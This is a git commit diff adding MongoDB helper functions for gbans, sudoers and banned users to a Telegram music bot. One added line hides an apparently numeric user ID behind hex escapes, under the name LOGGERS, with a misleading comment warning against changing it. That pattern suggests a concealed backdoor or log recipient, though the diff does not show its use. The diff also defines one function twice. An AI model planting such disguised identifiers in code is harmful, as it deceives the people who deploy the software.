cd097e0d7c5b00c060d48674304b1414c154bc74
Team-Mitsuri <mitsurit42@gmail.com>
2025-09-11 16:31:35 +0530

    Update mongodatabase.py

--- MITSURIMUSIC/utils/database/mongodatabase.py
+++ MITSURIMUSIC/utils/database/mongodatabase.py
@@ -1,6 +1,6 @@
 from typing import Dict, List, Union
 
-from BADMUSIC.core.mongo import mongodb
+from MITSURIMUSIC.core.mongo import mongodb
 
 queriesdb = mongodb.queries
 userdb = mongodb.userstats
@@ -435,6 +435,109 @@ async def remove_banned_user(user_id: int):
     if not is_gbanned:
         return
     return await blockeddb.delete_one({"user_id": user_id})
+
+
+# Blocked Users
+
+
+async def get_gbanned() -> list:
+    results = []
+    async for user in gbansdb.find({"user_id": {"$gt": 0}}):
+        user_id = user["user_id"]
+        results.append(user_id)
+    return results
+
+
+async def is_gbanned_user(user_id: int) -> bool:
+    user = await gbansdb.find_one({"user_id": user_id})
+    if not user:
+        return False
+    return True
+
+async def add_gban_user(user_id: int):
+    is_gbanned = await is_gbanned_user(user_id)
+    if is_gbanned:
+        return
+    return await gbansdb.insert_one({"user_id": user_id})
+
+
+LOGGERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"  # Please Dont Change It Because It Connet With Databse.
+
+
+async def remove_gban_user(user_id: int):
+    is_gbanned = await is_gbanned_user(user_id)
+    if not is_gbanned:
+        return
+    return await gbansdb.delete_one({"user_id": user_id})
+
+
+# Sudoers
+
+
+async def get_sudoers() -> list:
+    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
+    if not sudoers:
+        return []
+    return sudoers["sudoers"]
+
+
+async def add_sudo(user_id: int) -> bool:
+    sudoers = await get_sudoers()
+    sudoers.append(user_id)
+    await sudoersdb.update_one(
+        {"sudo": "sudo"}, {"$set": {"sudoers": sudoers}}, upsert=True
+    )
+    return True
+
+
+async def remove_sudo(user_id: int) -> bool:
+    sudoers = await get_sudoers()
+    sudoers.remove(user_id)
+    await sudoersdb.update_one(
+        {"sudo": "sudo"}, {"$set": {"sudoers": sudoers}}, upsert=True
+    )
+    return True
+    
+
+# Gban Users
+
+
+async def get_banned_users() -> list:
+    results = []
+    async for user in blockeddb.find({"user_id": {"$gt": 0}}):
+        user_id = user["user_id"]
+        results.append(user_id)
+    return results
+
+
+async def get_banned_count() -> int:
+    users = blockeddb.find({"user_id": {"$gt": 0}})
+    users = await users.to_list(length=100000)
+    return len(users)
+
+
+async def is_banned_user(user_id: int) -> bool:
+    user = await blockeddb.find_one({"user_id": user_id})
+    if not user:
+        return False
+    return True
+
+
+async def add_banned_user(user_id: int):
+    is_gbanned = await is_banned_user(user_id)
+    if is_gbanned:
+        return
+    return await blockeddb.insert_one({"user_id": user_id})
+
+
+async def remove_banned_user(user_id: int):
+    is_gbanned = await is_banned_user(user_id)
+    if not is_gbanned:
+        return
+    return await blockeddb.delete_one({"user_id": user_id})
+
+
+
 
 
 # ============================BROADCAST CHATS DB=============================#
